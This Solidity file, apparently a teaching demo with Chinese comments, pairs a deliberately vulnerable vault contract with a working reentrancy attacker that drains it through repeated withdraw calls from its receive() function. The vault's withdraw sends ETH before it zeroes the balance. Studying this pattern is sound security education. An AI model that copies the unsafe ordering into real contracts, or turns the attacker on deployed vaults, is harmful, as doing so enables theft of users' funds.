// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract VulnerableVault {
    mapping(address => uint256) public balances;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    constructor() payable{

    }
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    function withdraw() external {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "Insufficient balance");
        
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Transfer failed");
        balances[msg.sender] = 0;

        emit Withdrawal(msg.sender, balance);
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// 攻击合约
contract ReentrancyAttacker {
    VulnerableVault public vault;
    uint256 public attackCount;
    uint256 public stolenAmount;

    constructor(address _vaultAddress) {
        vault = VulnerableVault(_vaultAddress);
    }
    // 开始攻击
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether");   // 调用合约存款函数，此函数也要接收ETH
        vault.deposit{value: msg.value}();  // 存款
        vault.withdraw();                   // 取款
    }
    // 重入点：收到ETH时再次调用withdraw
    receive() external payable {
        attackCount++;
        stolenAmount += msg.value;
        
        if (vault.getBalance() >= 1 ether) {
            vault.withdraw();
        }
    }
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
